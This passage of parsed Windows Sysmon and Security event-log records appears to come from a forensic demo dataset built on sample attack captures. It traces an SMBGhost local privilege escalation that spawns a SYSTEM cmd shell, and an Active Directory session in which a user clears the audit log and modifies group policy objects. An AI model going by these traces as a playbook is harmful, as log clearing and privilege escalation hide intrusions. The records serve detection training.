22:26:14.521""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-0306-5f1e-0000-0010e15f3100""},{""@Name"":""ProcessId"",""#text"":""3660""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.17763.592 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""Windows Command Processor""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""Cmd.Exe""},{""@Name"":""CommandLine"",""#text"":""cmd""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""},{""@Name"":""LogonGuid"",""#text"":""747f3d96-f938-5f1d-0000-0020e7030000""},{""@Name"":""LogonId"",""#text"":""0x3E7""},{""@Name"":""TerminalSessionId"",""#text"":""1""},{""@Name"":""IntegrityLevel"",""#text"":""System""},{""@Name"":""Hashes"",""#text"":""SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18""},{""@Name"":""ParentProcessGuid"",""#text"":""747f3d96-f938-5f1d-0000-00104b500000""},{""@Name"":""ParentProcessId"",""#text"":""584""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\winlogon.exe""},{""@Name"":""ParentCommandLine"",""#text"":""winlogon.exe""}]}}"
3,339223,2020-07-26 22:26:15.1417649,3,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3332,3580,MSEDGEWIN10,0,S-1-5-18,Network connection,MSEDGEWIN10\IEUser,,"ProcessID: 7400, ProcessGUID: 747f3d96-ff9d-5f1d-0000-00100ac62400","RuleName: ",SourceHostname: MSEDGEWIN10,SourceIp: 127.0.0.1,DestinationHostname: MSEDGEWIN10,DestinationIp: 127.0.0.1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/CVE-2020-0796_SMBV3Ghost_LocalPrivEsc_Sysmon_3_1_10.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2020-07-26 22:13:19.375""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-ff9d-5f1d-0000-00100ac62400""},{""@Name"":""ProcessId"",""#text"":""7400""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""},{""@Name"":""User"",""#text"":""MSEDGEWIN10\\IEUser""},{""@Name"":""Protocol"",""#text"":""tcp""},{""@Name"":""Initiated"",""#text"":""True""},{""@Name"":""SourceIsIpv6"",""#text"":""False""},{""@Name"":""SourceIp"",""#text"":""127.0.0.1""},{""@Name"":""SourceHostname"",""#text"":""MSEDGEWIN10""},{""@Name"":""SourcePort"",""#text"":""49796""},{""@Name"":""SourcePortName""},{""@Name"":""DestinationIsIpv6"",""#text"":""False""},{""@Name"":""DestinationIp"",""#text"":""127.0.0.1""},{""@Name"":""DestinationHostname"",""#text"":""MSEDGEWIN10""},{""@Name"":""DestinationPort"",""#text"":""445""},{""@Name"":""DestinationPortName"",""#text"":""microsoft-ds""}]}}"
4,339224,2020-07-26 22:26:15.1417786,3,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3332,3580,MSEDGEWIN10,0,S-1-5-18,Network connection,NT AUTHORITY\SYSTEM,,"ProcessID: 4, ProcessGUID: 747f3d96-f935-5f1d-0000-0010eb030000","RuleName: ",SourceHostname: MSEDGEWIN10,SourceIp: 127.0.0.1,DestinationHostname: MSEDGEWIN10,DestinationIp: 127.0.0.1,System,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/CVE-2020-0796_SMBV3Ghost_LocalPrivEsc_Sysmon_3_1_10.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2020-07-26 22:13:19.375""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-f935-5f1d-0000-0010eb030000""},{""@Name"":""ProcessId"",""#text"":""4""},{""@Name"":""Image"",""#text"":""System""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""},{""@Name"":""Protocol"",""#text"":""tcp""},{""@Name"":""Initiated"",""#text"":""False""},{""@Name"":""SourceIsIpv6"",""#text"":""False""},{""@Name"":""SourceIp"",""#text"":""127.0.0.1""},{""@Name"":""SourceHostname"",""#text"":""MSEDGEWIN10""},{""@Name"":""SourcePort"",""#text"":""49796""},{""@Name"":""SourcePortName""},{""@Name"":""DestinationIsIpv6"",""#text"":""False""},{""@Name"":""DestinationIp"",""#text"":""127.0.0.1""},{""@Name"":""DestinationHostname"",""#text"":""MSEDGEWIN10""},{""@Name"":""DestinationPort"",""#text"":""445""},{""@Name"":""DestinationPortName"",""#text"":""microsoft-ds""}]}}"
1,198238040,2019-03-25 09:09:14.9166194,1102,Info,Microsoft-Windows-Eventlog,Security,744,2028,DC1.insecurebank.local,0,,Event log cleared,insecurebank\bob,,SID: (S-1-5-21-738609754-2819869699-4189121830-1108),,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,0x4020000000000000,0,"{""UserData"":{""LogFileCleared"":{""SubjectUserSid"":""S-1-5-21-738609754-2819869699-4189121830-1108"",""SubjectUserName"":""bob"",""SubjectDomainName"":""insecurebank"",""SubjectLogonId"":""0x8D7099""}}}"
2,198238041,2019-03-25 10:05:30.6956043,4662,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,4200,DC1.insecurebank.local,0,,Operation performed on an object,insecurebank\DC1$,,ObjectServer: DS,ObjectType: %{19195a5b-6da0-11d0-afd3-00c04fd930c9},ObjectName: %{c6faf700-bfe4-452a-a766-424f84c29583},"AccessList: Unknown code (%%7688, )",AccessMask: Unknown code (0x100),,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,2184,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0xB3AC2""},{""@Name"":""ObjectServer"",""#text"":""DS""},{""@Name"":""ObjectType"",""#text"":""%{19195a5b-6da0-11d0-afd3-00c04fd930c9}""},{""@Name"":""ObjectName"",""#text"":""%{c6faf700-bfe4-452a-a766-424f84c29583}""},{""@Name"":""OperationType"",""#text"":""Object Access""},{""@Name"":""HandleId"",""#text"":""0x0""},{""@Name"":""AccessList"",""#text"":""%%7688, ""},{""@Name"":""AccessMask"",""#text"":""0x100""},{""@Name"":""Properties"",""#text"":""%%7688, {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}, {19195a5b-6da0-11d0-afd3-00c04fd930c9}, ""},{""@Name"":""AdditionalInfo"",""#text"":""-""},{""@Name"":""AdditionalInfo2""}]}}"
3,198238042,2019-03-25 10:33:53.0246175,4662,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3616,DC1.insecurebank.local,0,,Operation performed on an object,insecurebank\bob,,ObjectServer: DS,ObjectType: %{f30e3bc2-9ff0-11d1-b603-0000f80367c1},ObjectName: %{6cdecdb5-7515-4511-8141-c34a7c3d4a0a},"AccessList: Unknown code (%%7685, )",AccessMask: Unknown code (0x20),,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""ObjectServer"",""#text"":""DS""},{""@Name"":""ObjectType"",""#text"":""%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}""},{""@Name"":""ObjectName"",""#text"":""%{6cdecdb5-7515-4511-8141-c34a7c3d4a0a}""},{""@Name"":""OperationType"",""#text"":""Object Access""},{""@Name"":""HandleId"",""#text"":""0x0""},{""@Name"":""AccessList"",""#text"":""%%7685, ""},{""@Name"":""AccessMask"",""#text"":""0x20""},{""@Name"":""Properties"",""#text"":""%%7685, {771727b1-31b8-4cdf-ae62-4fe39fadf89e}, {bf967a76-0de6-11d0-a285-00aa003049e2}, {f30e3bc2-9ff0-11d1-b603-0000f80367c1}, ""},{""@Name"":""AdditionalInfo"",""#text"":""-""},{""@Name"":""AdditionalInfo2""}]}}"
4,198238043,2019-03-25 10:33:56.4576297,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3488,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: CN={6AC1786C-016F-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL",ObjectClass: groupPolicyContainer,AttributeLDAPDisplayName: versionNumber,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""780ea6e1-6307-48d6-8b0d-8c45cc7534ae""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""CN={6AC1786C-016F-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL""},{""@Name"":""ObjectGUID"",""#text"":""6cdecdb5-7515-4511-8141-c34a7c3d4a0a""},{""@Name"":""ObjectClass"",""#text"":""groupPolicyContainer""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""versionNumber""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.9""},{""@Name"":""AttributeValue"",""#text"":""5""},{""@Name"":""OperationType"",""#text"":""%%14675""}]}}"
5,198238044,2019-03-25 10:33:56.4576297,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,2868,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: CN={6AC1786C-016F-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL",ObjectClass: groupPolicyContainer,AttributeLDAPDisplayName: versionNumber,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""780ea6e1-6307-48d6-8b0d-8c45cc7534ae""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""CN={6AC1786C-016F-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL""},{""@Name"":""ObjectGUID"",""#text"":""6cdecdb5-7515-4511-8141-c34a7c3d4a0a""},{""@Name"":""ObjectClass"",""#text"":""groupPolicyContainer""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""versionNumber""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.9""},{""@Name"":""AttributeValue"",""#text"":""6""},{""@Name"":""OperationType"",""#text"":""%%14674""}]}}"
6,198238045,2019-03-25 10:34:07.3856154,4662,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3616,DC1.insecurebank.local,0,,Operation performed on an object,insecurebank\bob,,ObjectServer: DS,ObjectType: %{f30e3bc2-9ff0-11d1-b603-0000f80367c1},ObjectName: %{6cdecdb5-7515-4511-8141-c34a7c3d4a0a},"AccessList: Unknown code (%%7685, )",AccessMask: Unknown code (0x20),,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""ObjectServer"",""#text"":""DS""},{""@Name"":""ObjectType"",""#text"":""%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}""},{""@Name"":""ObjectName"",""#text"":""%{6cdecdb5-7515-4511-8141-c34a7c3d4a0a}""},{""@Name"":""OperationType"",""#text"":""Object Access""},{""@Name"":""HandleId"",""#text"":""0x0""},{""@Name"":""AccessList"",""#text"":""%%7685, ""},{""@Name"":""AccessMask"",""#text"":""0x20""},{""@Name"":""Properties"",""#text"":""%%7685, {771727b1-31b8-4cdf-ae62-4fe39fadf89e}, {bf967a76-0de6-11d0-a285-00aa003049e2}, {f30e3bc2-9ff0-11d1-b603-0000f80367c1}, ""},{""@Name"":""AdditionalInfo"",""#text"":""-""},{""@Name"":""AdditionalInfo2""}]}}"
7,198238046,2019-03-25 10:34:16.4586315,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,1420,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: CN={6AC1786C-016F-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL",ObjectClass: groupPolicyContainer,AttributeLDAPDisplayName: versionNumber,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,760,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""4929664a-5cd8-4c73-bf19-223aca5501f3""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""CN={6AC1786C-016F-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL""},{""@Name"":""ObjectGUID"",""#text"":""6cdecdb5-7515-4511-8141-c34a7c3d4a0a""},{""@Name"":""ObjectClass"",""#text"":""groupPolicyContainer""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""versionNumber""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.9""},{""@Name"":""AttributeValue"",""#text"":""6""},{""@Name"":""OperationType"",""#text"":""%%14675""}]}}"
8,198238047,2019-03-25 10:34:16.4586315,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,1420,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: CN={6AC1786C-016F-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL",ObjectClass: groupPolicyContainer,AttributeLDAPDisplayName: versionNumber,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""4929664a-5cd8-4c73-bf19-223aca5501f3""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""CN={6AC1786C-016F-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL""},{""@Name"":""ObjectGUID"",""#text"":""6cdecdb5-7515-4511-8141-c34a7c3d4a0a""},{""@Name"":""ObjectClass"",""#text"":""groupPolicyContainer""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""versionNumber""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.9""},{""@Name"":""AttributeValue"",""#text"":""7""},{""@Name"":""OperationType"",""#text"":""%%14674""}]}}"
9,198238048,2019-03-25 10:35:09.4636097,4662,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,2868,DC1.insecurebank.local,0,,Operation performed on an object,insecurebank\bob,,ObjectServer: DS,ObjectType: %{f30e3bc2-9ff0-11d1-b603-0000f80367c1},ObjectName: %{6d8a089c-f91e-41b4-a1d6-5985255210c3},"AccessList: Unknown code (%%7685, )",AccessMask: Unknown code (0x20),,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""ObjectServer"",""#text"":""DS""},{""@Name"":""ObjectType"",""#text"":""%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}""},{""@Name"":""ObjectName"",""#text"":""%{6d8a089c-f91e-41b4-a1d6-5985255210c3}""},{""@Name"":""OperationType"",""#text"":""Object Access""},{""@Name"":""HandleId"",""#text"":""0x0""},{""@Name"":""AccessList"",""#text"":""%%7685, ""},{""@Name"":""AccessMask"",""#text"":""0x20""},{""@Name"":""Properties"",""#text"":""%%7685, {771727b1-31b8-4cdf-ae62-4fe39fadf89e}, {bf967a76-0de6-11d0-a285-00aa003049e2}, {f30e3bc2-9ff0-11d1-b603-0000f80367c1}, ""},{""@Name"":""AdditionalInfo"",""#text"":""-""},{""@Name"":""AdditionalInfo2""}]}}"
10,198238049,2019-03-25 10:35:16.4626167,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3616,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL",ObjectClass: groupPolicyContainer,AttributeLDAPDisplayName: versionNumber,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""6548db79-3ad6-41e2-a3bb-c3506a86b579""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL""},{""@Name"":""ObjectGUID"",""#text"":""6d8a089c-f91e-41b4-a1d6-5985255210c3""},{""@Name"":""ObjectClass"",""#text"":""groupPolicyContainer""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""versionNumber""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.9""},{""@Name"":""AttributeValue"",""#text"":""65554""},{""@Name"":""OperationType"",""#text"":""%%14675""}]}}"
11,198238050,2019-03-25 10:35:16.4626167,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3616,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL",ObjectClass: groupPolicyContainer,AttributeLDAPDisplayName: versionNumber,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""6548db79-3ad6-41e2-a3bb-c3506a86b579""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL""},{""@Name"":""ObjectGUID"",""#text"":""6d8a089c-f91e-41b4-a1d6-5985255210c3""},{""@Name"":""ObjectClass"",""#text"":""groupPolicyContainer""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""versionNumber""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.9""},{""@Name"":""AttributeValue"",""#text"":""65555""},{""@Name"":""OperationType"",""#text"":""%%14674""}]}}"
12,198238051,2019-03-25 10:35:30.8736221,4662,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3488,DC1.insecurebank.local,0,,Operation performed on an object,insecurebank\bob,,ObjectServer: DS,ObjectType: %{f30e3bc2-9ff0-11d1-b603-0000f80367c1},ObjectName: %{6d8a089c-f91e-41b4-a1d6-5985255210c3},"AccessList: Unknown code (%%7685, )",AccessMask: Unknown code (0x20),,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""ObjectServer"",""#text"":""DS""},{""@Name"":""ObjectType"",""#text"":""%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}""},{""@Name"":""ObjectName"",""#text"":""%{6d8a089c-f91e-41b4-a1d6-5985255210c3}""},{""@Name"":""OperationType"",""#text"":""Object Access""},{""@Name"":""HandleId"",""#text"":""0x0""},{""@Name"":""AccessList"",""#text"":""%%7685, ""},{""@Name"":""AccessMask"",""#text"":""0x20""},{""@Name"":""Properties"",""#text"":""%%7685, {771727b1-31b8-4cdf-ae62-4fe39fadf89e}, {bf967a76-0de6-11d0-a285-00aa003049e2}, {f30e3bc2-9ff0-11d1-b603-0000f80367c1}, ""},{""@Name"":""AdditionalInfo"",""#text"":""-""},{""@Name"":""AdditionalInfo2""}]}}"
13,198238052,2019-03-25 10:35:36.4636267,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3488,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL",ObjectClass: groupPolicyContainer,AttributeLDAPDisplayName: versionNumber,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""b48b013c-1d7b-4192-9185-efc882c4947a""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL""},{""@Name"":""ObjectGUID"",""#text"":""6d8a089c-f91e-41b4-a1d6-5985255210c3""},{""@Name"":""ObjectClass"",""#text"":""groupPolicyContainer""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""versionNumber""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.9""},{""@Name"":""AttributeValue"",""#text"":""65555""},{""@Name"":""OperationType"",""#text"":""%%14675""}]}}"
14,198238053,2019-03-25 10:35:36.4636267,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3488,DC1.insecurebank.local,0,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL",ObjectClass: groupPolicyContainer,AttributeLDAPDisplayName: versionNumber,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""b48b013c-1d7b-4192-9185-efc882c4947a""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x8D7099""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=INSECUREBANK,DC=LOCAL""},{""@Name"":""ObjectGUID"",""#text"":""6d8a089c-f91e-41b4-a1d6-5985255210c3""},{""@Name"":""ObjectClass"",""#text"":""groupPolicyContainer""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""versionNumber""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.9""},{""@Name"":""AttributeValue"",""#text"":""65556""},{""@Name"":""OperationType"",""#text"":""%%14674""}]}}"
15,198238054,2019-03-25 10:36:03.9746084,4719,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,3616,DC1.insecurebank.local,0,,System audit policy was changed,insecurebank\DC1$,,CategoryId: %%8273 SubcategoryId: %%12544,SubcategoryGuid: 0cce9215-69ae-11d9-bed3-505054503030,"AuditPolicyChanges: %%8449, %%8451",,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/ACL_ForcePwd_SPNAdd_User_Computer_Accounts.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E7""},{""@Name"":""CategoryId"",""#text"":""%%8273""},{""@Name"":""SubcategoryId"",""#text"":""%%12544""},{""@Name"":""SubcategoryGuid"",""#text"":""0cce9215-69ae-11d9-bed3-505054503030""},{""@Name"":""AuditPolicyChanges"",""#text"":""%%8449, %%8451""}]}}"
